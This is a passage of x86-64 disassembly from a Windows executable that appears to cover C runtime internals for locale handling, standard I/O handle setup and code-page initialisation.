   1400047b8:	48 8d 05 89 43 01 00 	lea    0x14389(%rip),%rax        # 0x140018b48
   1400047bf:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400047c3:	89 51 28             	mov    %edx,0x28(%rcx)
   1400047c6:	48 8d 0d a3 9a 00 00 	lea    0x9aa3(%rip),%rcx        # 0x14000e270
   1400047cd:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400047d1:	48 89 08             	mov    %rcx,(%rax)
   1400047d4:	48 8d 0d 95 28 01 00 	lea    0x12895(%rip),%rcx        # 0x140017070
   1400047db:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400047df:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   1400047e5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400047e9:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   1400047f0:	8d 4a 42             	lea    0x42(%rdx),%ecx
   1400047f3:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400047f7:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   1400047fb:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   140004802:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004806:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   14000480d:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004811:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004815:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   14000481c:	00 
   14000481d:	e8 16 01 00 00       	call   0x140004938
   140004822:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140004826:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000482a:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   14000482e:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004832:	e8 41 01 00 00       	call   0x140004978
   140004837:	48 83 c4 50          	add    $0x50,%rsp
   14000483b:	5d                   	pop    %rbp
   14000483c:	c3                   	ret
   14000483d:	cc                   	int3
   14000483e:	cc                   	int3
   14000483f:	cc                   	int3
   140004840:	40 55                	rex push %rbp
   140004842:	48 8b ec             	mov    %rsp,%rbp
   140004845:	48 83 ec 40          	sub    $0x40,%rsp
   140004849:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   14000484d:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140004851:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004855:	48 8d 15 14 9a 00 00 	lea    0x9a14(%rip),%rdx        # 0x14000e270
   14000485c:	b8 05 00 00 00       	mov    $0x5,%eax
   140004861:	89 45 20             	mov    %eax,0x20(%rbp)
   140004864:	89 45 28             	mov    %eax,0x28(%rbp)
   140004867:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   14000486b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000486f:	b8 04 00 00 00       	mov    $0x4,%eax
   140004874:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140004877:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000487a:	48 8b 01             	mov    (%rcx),%rax
   14000487d:	48 3b c2             	cmp    %rdx,%rax
   140004880:	74 0c                	je     0x14000488e
   140004882:	48 8b c8             	mov    %rax,%rcx
   140004885:	e8 4a 0f 00 00       	call   0x1400057d4
   14000488a:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000488e:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   140004892:	e8 3d 0f 00 00       	call   0x1400057d4
   140004897:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000489b:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   14000489f:	e8 30 0f 00 00       	call   0x1400057d4
   1400048a4:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048a8:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   1400048ac:	e8 23 0f 00 00       	call   0x1400057d4
   1400048b1:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048b5:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   1400048b9:	e8 16 0f 00 00       	call   0x1400057d4
   1400048be:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048c2:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   1400048c6:	e8 09 0f 00 00       	call   0x1400057d4
   1400048cb:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048cf:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   1400048d3:	e8 fc 0e 00 00       	call   0x1400057d4
   1400048d8:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048dc:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   1400048e0:	e8 ef 0e 00 00       	call   0x1400057d4
   1400048e5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048e9:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   1400048f0:	e8 df 0e 00 00       	call   0x1400057d4
   1400048f5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048f9:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   140004900:	e8 cf 0e 00 00       	call   0x1400057d4
   140004905:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140004909:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000490d:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140004911:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004915:	e8 a6 00 00 00       	call   0x1400049c0
   14000491a:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000491e:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   140004922:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   140004926:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000492a:	e8 f1 00 00 00       	call   0x140004a20
   14000492f:	48 83 c4 40          	add    $0x40,%rsp
   140004933:	5d                   	pop    %rbp
   140004934:	c3                   	ret
   140004935:	cc                   	int3
   140004936:	cc                   	int3
   140004937:	cc                   	int3
   140004938:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000493d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004942:	57                   	push   %rdi
   140004943:	48 83 ec 20          	sub    $0x20,%rsp
   140004947:	49 8b d9             	mov    %r9,%rbx
   14000494a:	49 8b f8             	mov    %r8,%rdi
   14000494d:	8b 0a                	mov    (%rdx),%ecx
   14000494f:	e8 8c fa ff ff       	call   0x1400043e0
   140004954:	90                   	nop
   140004955:	48 8b 07             	mov    (%rdi),%rax
   140004958:	48 8b 08             	mov    (%rax),%rcx
   14000495b:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140004962:	f0 ff 00             	lock incl (%rax)
   140004965:	8b 0b                	mov    (%rbx),%ecx
   140004967:	e8 90 fa ff ff       	call   0x1400043fc
   14000496c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004971:	48 83 c4 20          	add    $0x20,%rsp
   140004975:	5f                   	pop    %rdi
   140004976:	c3                   	ret
   140004977:	cc                   	int3
   140004978:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000497d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004982:	57                   	push   %rdi
   140004983:	48 83 ec 20          	sub    $0x20,%rsp
   140004987:	49 8b d9             	mov    %r9,%rbx
   14000498a:	49 8b f8             	mov    %r8,%rdi
   14000498d:	8b 0a                	mov    (%rdx),%ecx
   14000498f:	e8 4c fa ff ff       	call   0x1400043e0
   140004994:	90                   	nop
   140004995:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140004999:	48 8b 10             	mov    (%rax),%rdx
   14000499c:	48 8b 0f             	mov    (%rdi),%rcx
   14000499f:	48 8b 12             	mov    (%rdx),%rdx
   1400049a2:	48 8b 09             	mov    (%rcx),%rcx
   1400049a5:	e8 5e fd ff ff       	call   0x140004708
   1400049aa:	90                   	nop
   1400049ab:	8b 0b                	mov    (%rbx),%ecx
   1400049ad:	e8 4a fa ff ff       	call   0x1400043fc
   1400049b2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400049b7:	48 83 c4 20          	add    $0x20,%rsp
   1400049bb:	5f                   	pop    %rdi
   1400049bc:	c3                   	ret
   1400049bd:	cc                   	int3
   1400049be:	cc                   	int3
   1400049bf:	cc                   	int3
   1400049c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400049c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400049ca:	57                   	push   %rdi
   1400049cb:	48 83 ec 20          	sub    $0x20,%rsp
   1400049cf:	49 8b d9             	mov    %r9,%rbx
   1400049d2:	49 8b f8             	mov    %r8,%rdi
   1400049d5:	8b 0a                	mov    (%rdx),%ecx
   1400049d7:	e8 04 fa ff ff       	call   0x1400043e0
   1400049dc:	90                   	nop
   1400049dd:	48 8b 07             	mov    (%rdi),%rax
   1400049e0:	48 8b 08             	mov    (%rax),%rcx
   1400049e3:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   1400049ea:	48 85 c9             	test   %rcx,%rcx
   1400049ed:	74 1e                	je     0x140004a0d
   1400049ef:	83 c8 ff             	or     $0xffffffff,%eax
   1400049f2:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   1400049f6:	83 f8 01             	cmp    $0x1,%eax
   1400049f9:	75 12                	jne    0x140004a0d
   1400049fb:	48 8d 05 6e 26 01 00 	lea    0x1266e(%rip),%rax        # 0x140017070
   140004a02:	48 3b c8             	cmp    %rax,%rcx
   140004a05:	74 06                	je     0x140004a0d
   140004a07:	e8 c8 0d 00 00       	call   0x1400057d4
   140004a0c:	90                   	nop
   140004a0d:	8b 0b                	mov    (%rbx),%ecx
   140004a0f:	e8 e8 f9 ff ff       	call   0x1400043fc
   140004a14:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004a19:	48 83 c4 20          	add    $0x20,%rsp
   140004a1d:	5f                   	pop    %rdi
   140004a1e:	c3                   	ret
   140004a1f:	cc                   	int3
   140004a20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004a25:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004a2a:	57                   	push   %rdi
   140004a2b:	48 83 ec 20          	sub    $0x20,%rsp
   140004a2f:	49 8b d9             	mov    %r9,%rbx
   140004a32:	49 8b f8             	mov    %r8,%rdi
   140004a35:	8b 0a                	mov    (%rdx),%ecx
   140004a37:	e8 a4 f9 ff ff       	call   0x1400043e0
   140004a3c:	90                   	nop
   140004a3d:	48 8b 0f             	mov    (%rdi),%rcx
   140004a40:	33 d2                	xor    %edx,%edx
   140004a42:	48 8b 09             	mov    (%rcx),%rcx
   140004a45:	e8 be fc ff ff       	call   0x140004708
   140004a4a:	90                   	nop
   140004a4b:	8b 0b                	mov    (%rbx),%ecx
   140004a4d:	e8 aa f9 ff ff       	call   0x1400043fc
   140004a52:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004a57:	48 83 c4 20          	add    $0x20,%rsp
   140004a5b:	5f                   	pop    %rdi
   140004a5c:	c3                   	ret
   140004a5d:	cc                   	int3
   140004a5e:	cc                   	int3
   140004a5f:	cc                   	int3
   140004a60:	40 53                	rex push %rbx
   140004a62:	48 83 ec 20          	sub    $0x20,%rsp
   140004a66:	b9 07 00 00 00       	mov    $0x7,%ecx
   140004a6b:	e8 70 f9 ff ff       	call   0x1400043e0
   140004a70:	33 db                	xor    %ebx,%ebx
   140004a72:	33 c9                	xor    %ecx,%ecx
   140004a74:	e8 fb 39 00 00       	call   0x140008474
   140004a79:	85 c0                	test   %eax,%eax
   140004a7b:	75 0c                	jne    0x140004a89
   140004a7d:	e8 5a 00 00 00       	call   0x140004adc
   140004a82:	e8 45 01 00 00       	call   0x140004bcc
   140004a87:	b3 01                	mov    $0x1,%bl
   140004a89:	b9 07 00 00 00       	mov    $0x7,%ecx
   140004a8e:	e8 69 f9 ff ff       	call   0x1400043fc
   140004a93:	8a c3                	mov    %bl,%al
   140004a95:	48 83 c4 20          	add    $0x20,%rsp
   140004a99:	5b                   	pop    %rbx
   140004a9a:	c3                   	ret
   140004a9b:	cc                   	int3
   140004a9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004aa1:	57                   	push   %rdi
   140004aa2:	48 83 ec 20          	sub    $0x20,%rsp
   140004aa6:	33 db                	xor    %ebx,%ebx
   140004aa8:	48 8d 3d 41 3c 01 00 	lea    0x13c41(%rip),%rdi        # 0x1400186f0
   140004aaf:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   140004ab3:	48 85 c9             	test   %rcx,%rcx
   140004ab6:	74 0a                	je     0x140004ac2
   140004ab8:	e8 67 39 00 00       	call   0x140008424
   140004abd:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   140004ac2:	48 83 c3 08          	add    $0x8,%rbx
   140004ac6:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   140004acd:	72 d9                	jb     0x140004aa8
   140004acf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004ad4:	b0 01                	mov    $0x1,%al
   140004ad6:	48 83 c4 20          	add    $0x20,%rsp
   140004ada:	5f                   	pop    %rdi
   140004adb:	c3                   	ret
   140004adc:	48 8b c4             	mov    %rsp,%rax
   140004adf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004ae3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004ae7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140004aeb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004aef:	41 56                	push   %r14
   140004af1:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140004af8:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   140004afc:	ff 15 3e 0d 01 00    	call   *0x10d3e(%rip)        # 0x140015840
   140004b02:	45 33 f6             	xor    %r14d,%r14d
   140004b05:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   140004b0b:	0f 84 9a 00 00 00    	je     0x140004bab
   140004b11:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140004b16:	48 85 c0             	test   %rax,%rax
   140004b19:	0f 84 8c 00 00 00    	je     0x140004bab
   140004b1f:	48 63 18             	movslq (%rax),%rbx
   140004b22:	48 8d 70 04          	lea    0x4(%rax),%rsi
   140004b26:	bf 00 20 00 00       	mov    $0x2000,%edi
   140004b2b:	48 03 de             	add    %rsi,%rbx
   140004b2e:	39 38                	cmp    %edi,(%rax)
   140004b30:	0f 4c 38             	cmovl  (%rax),%edi
   140004b33:	8b cf                	mov    %edi,%ecx
   140004b35:	e8 3a 39 00 00       	call   0x140008474
   140004b3a:	3b 3d b0 3f 01 00    	cmp    0x13fb0(%rip),%edi        # 0x140018af0
   140004b40:	0f 4f 3d a9 3f 01 00 	cmovg  0x13fa9(%rip),%edi        # 0x140018af0
   140004b47:	85 ff                	test   %edi,%edi
   140004b49:	74 60                	je     0x140004bab
   140004b4b:	41 8b ee             	mov    %r14d,%ebp
   140004b4e:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140004b52:	74 47                	je     0x140004b9b
   140004b54:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   140004b58:	74 41                	je     0x140004b9b
   140004b5a:	f6 06 01             	testb  $0x1,(%rsi)
   140004b5d:	74 3c                	je     0x140004b9b
   140004b5f:	f6 06 08             	testb  $0x8,(%rsi)
   140004b62:	75 0d                	jne    0x140004b71
   140004b64:	48 8b 0b             	mov    (%rbx),%rcx
   140004b67:	ff 15 93 0c 01 00    	call   *0x10c93(%rip)        # 0x140015800
   140004b6d:	85 c0                	test   %eax,%eax
   140004b6f:	74 2a                	je     0x140004b9b
   140004b71:	48 8b c5             	mov    %rbp,%rax
   140004b74:	4c 8d 05 75 3b 01 00 	lea    0x13b75(%rip),%r8        # 0x1400186f0
   140004b7b:	48 8b cd             	mov    %rbp,%rcx
   140004b7e:	48 c1 f9 06          	sar    $0x6,%rcx
   140004b82:	83 e0 3f             	and    $0x3f,%eax
   140004b85:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   140004b89:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   140004b8d:	48 8b 03             	mov    (%rbx),%rax
   140004b90:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   140004b95:	8a 06                	mov    (%rsi),%al
   140004b97:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   140004b9b:	48 ff c5             	inc    %rbp
   140004b9e:	48 ff c6             	inc    %rsi
   140004ba1:	48 83 c3 08          	add    $0x8,%rbx
   140004ba5:	48 83 ef 01          	sub    $0x1,%rdi
   140004ba9:	75 a3                	jne    0x140004b4e
   140004bab:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140004bb2:	00 
   140004bb3:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004bb7:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140004bbb:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140004bbf:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140004bc3:	49 8b e3             	mov    %r11,%rsp
   140004bc6:	41 5e                	pop    %r14
   140004bc8:	c3                   	ret
   140004bc9:	cc                   	int3
   140004bca:	cc                   	int3
   140004bcb:	cc                   	int3
   140004bcc:	48 8b c4             	mov    %rsp,%rax
   140004bcf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004bd3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004bd7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140004bdb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004bdf:	41 56                	push   %r14
   140004be1:	48 83 ec 20          	sub    $0x20,%rsp
   140004be5:	33 f6                	xor    %esi,%esi
   140004be7:	45 33 f6             	xor    %r14d,%r14d
   140004bea:	48 63 ce             	movslq %esi,%rcx
   140004bed:	48 8d 3d fc 3a 01 00 	lea    0x13afc(%rip),%rdi        # 0x1400186f0
   140004bf4:	48 8b c1             	mov    %rcx,%rax
   140004bf7:	83 e1 3f             	and    $0x3f,%ecx
   140004bfa:	48 c1 f8 06          	sar    $0x6,%rax
   140004bfe:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   140004c02:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   140004c06:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   140004c0b:	48 83 c0 02          	add    $0x2,%rax
   140004c0f:	48 83 f8 01          	cmp    $0x1,%rax
   140004c13:	76 0a                	jbe    0x140004c1f
   140004c15:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   140004c1a:	e9 8f 00 00 00       	jmp    0x140004cae
   140004c1f:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   140004c24:	8b ce                	mov    %esi,%ecx
   140004c26:	85 f6                	test   %esi,%esi
   140004c28:	74 16                	je     0x140004c40
   140004c2a:	83 e9 01             	sub    $0x1,%ecx
   140004c2d:	74 0a                	je     0x140004c39
   140004c2f:	83 f9 01             	cmp    $0x1,%ecx
   140004c32:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140004c37:	eb 0c                	jmp    0x140004c45
   140004c39:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140004c3e:	eb 05                	jmp    0x140004c45
   140004c40:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140004c45:	ff 15 fd 0b 01 00    	call   *0x10bfd(%rip)        # 0x140015848
   140004c4b:	48 8b e8             	mov    %rax,%rbp
   140004c4e:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140004c52:	48 83 f9 01          	cmp    $0x1,%rcx
   140004c56:	76 0b                	jbe    0x140004c63
   140004c58:	48 8b c8             	mov    %rax,%rcx
   140004c5b:	ff 15 9f 0b 01 00    	call   *0x10b9f(%rip)        # 0x140015800
   140004c61:	eb 02                	jmp    0x140004c65
   140004c63:	33 c0                	xor    %eax,%eax
   140004c65:	85 c0                	test   %eax,%eax
   140004c67:	74 20                	je     0x140004c89
   140004c69:	0f b6 c8             	movzbl %al,%ecx
   140004c6c:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   140004c71:	83 f9 02             	cmp    $0x2,%ecx
   140004c74:	75 07                	jne    0x140004c7d
   140004c76:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140004c7b:	eb 31                	jmp    0x140004cae
   140004c7d:	83 f9 03             	cmp    $0x3,%ecx
   140004c80:	75 2c                	jne    0x140004cae
   140004c82:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   140004c87:	eb 25                	jmp    0x140004cae
   140004c89:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140004c8e:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   140004c95:	ff ff 
   140004c97:	48 8b 05 ba 3e 01 00 	mov    0x13eba(%rip),%rax        # 0x140018b58
   140004c9e:	48 85 c0             	test   %rax,%rax
   140004ca1:	74 0b                	je     0x140004cae
   140004ca3:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   140004ca7:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   140004cae:	ff c6                	inc    %esi
   140004cb0:	49 83 c6 08          	add    $0x8,%r14
   140004cb4:	83 fe 03             	cmp    $0x3,%esi
   140004cb7:	0f 85 2d ff ff ff    	jne    0x140004bea
   140004cbd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004cc2:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004cc7:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004ccc:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140004cd1:	48 83 c4 20          	add    $0x20,%rsp
   140004cd5:	41 5e                	pop    %r14
   140004cd7:	c3                   	ret
   140004cd8:	48 83 ec 28          	sub    $0x28,%rsp
   140004cdc:	e8 bf f7 ff ff       	call   0x1400044a0
   140004ce1:	48 8b c8             	mov    %rax,%rcx
   140004ce4:	48 8d 15 1d 3e 01 00 	lea    0x13e1d(%rip),%rdx        # 0x140018b08
   140004ceb:	48 83 c4 28          	add    $0x28,%rsp
   140004cef:	e9 c8 04 00 00       	jmp    0x1400051bc
   140004cf4:	48 83 ec 28          	sub    $0x28,%rsp
   140004cf8:	80 3d 15 3e 01 00 00 	cmpb   $0x0,0x13e15(%rip)        # 0x140018b14
   140004cff:	75 4c                	jne    0x140004d4d
   140004d01:	48 8d 0d a8 26 01 00 	lea    0x126a8(%rip),%rcx        # 0x1400173b0
   140004d08:	48 89 0d f1 3d 01 00 	mov    %rcx,0x13df1(%rip)        # 0x140018b00
   140004d0f:	48 8d 05 5a 23 01 00 	lea    0x1235a(%rip),%rax        # 0x140017070
   140004d16:	48 8d 0d 83 25 01 00 	lea    0x12583(%rip),%rcx        # 0x1400172a0
   140004d1d:	48 89 05 e4 3d 01 00 	mov    %rax,0x13de4(%rip)        # 0x140018b08
   140004d24:	48 89 0d cd 3d 01 00 	mov    %rcx,0x13dcd(%rip)        # 0x140018af8
   140004d2b:	e8 44 f8 ff ff       	call   0x140004574
   140004d30:	4c 8d 0d d1 3d 01 00 	lea    0x13dd1(%rip),%r9        # 0x140018b08
   140004d37:	4c 8b c0             	mov    %rax,%r8
   140004d3a:	b2 01                	mov    $0x1,%dl
   140004d3c:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   140004d41:	e8 2e 05 00 00       	call   0x140005274
   140004d46:	c6 05 c7 3d 01 00 01 	movb   $0x1,0x13dc7(%rip)        # 0x140018b14
   140004d4d:	b0 01                	mov    $0x1,%al
   140004d4f:	48 83 c4 28          	add    $0x28,%rsp
   140004d53:	c3                   	ret
   140004d54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004d59:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004d5e:	57                   	push   %rdi
   140004d5f:	48 83 ec 20          	sub    $0x20,%rsp
   140004d63:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140004d67:	48 8b f9             	mov    %rcx,%rdi
   140004d6a:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   140004d6e:	48 85 d2             	test   %rdx,%rdx
   140004d71:	74 05                	je     0x140004d78
   140004d73:	0f 10 02             	movups (%rdx),%xmm0
   140004d76:	eb 10                	jmp    0x140004d88
   140004d78:	83 3d f9 32 01 00 00 	cmpl   $0x0,0x132f9(%rip)        # 0x140018078
   140004d7f:	75 0d                	jne    0x140004d8e
   140004d81:	0f 10 05 80 29 01 00 	movups 0x12980(%rip),%xmm0        # 0x140017708
   140004d88:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140004d8c:	eb 4e                	jmp    0x140004ddc
   140004d8e:	e8 0d f7 ff ff       	call   0x1400044a0
   140004d93:	48 89 07             	mov    %rax,(%rdi)
   140004d96:	48 8b d6             	mov    %rsi,%rdx
   140004d99:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140004da0:	48 89 0e             	mov    %rcx,(%rsi)
   140004da3:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140004daa:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140004dae:	48 8b c8             	mov    %rax,%rcx
   140004db1:	e8 52 46 00 00       	call   0x140009408
   140004db6:	48 8b 0f             	mov    (%rdi),%rcx
   140004db9:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140004dbd:	e8 7a 46 00 00       	call   0x14000943c
   140004dc2:	48 8b 0f             	mov    (%rdi),%rcx
   140004dc5:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140004dcb:	a8 02                	test   $0x2,%al
   140004dcd:	75 0d                	jne    0x140004ddc
   140004dcf:	83 c8 02             	or     $0x2,%eax
   140004dd2:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   140004dd8:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140004ddc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004de1:	48 8b c7             	mov    %rdi,%rax
   140004de4:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004de9:	48 83 c4 20          	add    $0x20,%rsp
   140004ded:	5f                   	pop    %rdi
   140004dee:	c3                   	ret
   140004def:	cc                   	int3
   140004df0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004df5:	55                   	push   %rbp
   140004df6:	56                   	push   %rsi
   140004df7:	57                   	push   %rdi
   140004df8:	41 54                	push   %r12
   140004dfa:	41 55                	push   %r13
   140004dfc:	41 56                	push   %r14
   140004dfe:	41 57                	push   %r15
   140004e00:	48 83 ec 40          	sub    $0x40,%rsp
   140004e04:	48 8b 05 2d 22 01 00 	mov    0x1222d(%rip),%rax        # 0x140017038
   140004e0b:	48 33 c4             	xor    %rsp,%rax
   140004e0e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004e13:	48 8b f2             	mov    %rdx,%rsi
   140004e16:	e8 91 02 00 00       	call   0x1400050ac
   140004e1b:	33 db                	xor    %ebx,%ebx
   140004e1d:	8b f8                	mov    %eax,%edi
   140004e1f:	85 c0                	test   %eax,%eax
   140004e21:	0f 84 53 02 00 00    	je     0x14000507a
   140004e27:	4c 8d 2d 92 26 01 00 	lea    0x12692(%rip),%r13        # 0x1400174c0
   140004e2e:	44 8b f3             	mov    %ebx,%r14d
   140004e31:	49 8b c5             	mov    %r13,%rax
   140004e34:	8d 6b 01             	lea    0x1(%rbx),%ebp
   140004e37:	39 38                	cmp    %edi,(%rax)
   140004e39:	0f 84 4e 01 00 00    	je     0x140004f8d
   140004e3f:	44 03 f5             	add    %ebp,%r14d
   140004e42:	48 83 c0 30          	add    $0x30,%rax
   140004e46:	41 83 fe 05          	cmp    $0x5,%r14d
   140004e4a:	72 eb                	jb     0x140004e37
   140004e4c:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   140004e52:	0f 84 2d 01 00 00    	je     0x140004f85
   140004e58:	0f b7 cf             	movzwl %di,%ecx
   140004e5b:	ff 15 3f 0a 01 00    	call   *0x10a3f(%rip)        # 0x1400158a0
   140004e61:	85 c0                	test   %eax,%eax
   140004e63:	0f 84 1c 01 00 00    	je     0x140004f85
   140004e69:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   140004e6e:	3b f8                	cmp    %eax,%edi
   140004e70:	75 2e                	jne    0x140004ea0
   140004e72:	48 89 46 04          	mov    %rax,0x4(%rsi)
   140004e76:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140004e7d:	89 5e 18             	mov    %ebx,0x18(%rsi)
   140004e80:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   140004e84:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   140004e88:	0f b7 c3             	movzwl %bx,%eax
   140004e8b:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004e90:	66 f3 ab             	rep stos %ax,(%rdi)
   140004e93:	48 8b ce             	mov    %rsi,%rcx
   140004e96:	e8 99 05 00 00       	call   0x140005434
   140004e9b:	e9 e2 01 00 00       	jmp    0x140005082
   140004ea0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004ea5:	8b cf                	mov    %edi,%ecx
   140004ea7:	ff 15 0b 09 01 00    	call   *0x1090b(%rip)        # 0x1400157b8
   140004ead:	85 c0                	test   %eax,%eax
   140004eaf:	0f 84 c4 00 00 00    	je     0x140004f79
